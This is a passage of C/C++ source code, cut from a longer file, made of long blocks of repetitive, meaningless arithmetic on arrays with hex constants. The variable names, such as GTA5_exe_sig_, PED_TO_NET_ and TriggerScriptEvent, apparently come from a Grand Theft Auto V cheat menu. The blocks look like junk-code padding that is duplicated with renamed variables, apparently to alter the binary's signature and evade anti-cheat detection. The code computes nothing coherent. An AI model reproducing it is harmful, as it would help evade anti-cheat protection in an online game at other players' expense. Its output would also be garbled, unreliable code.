				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
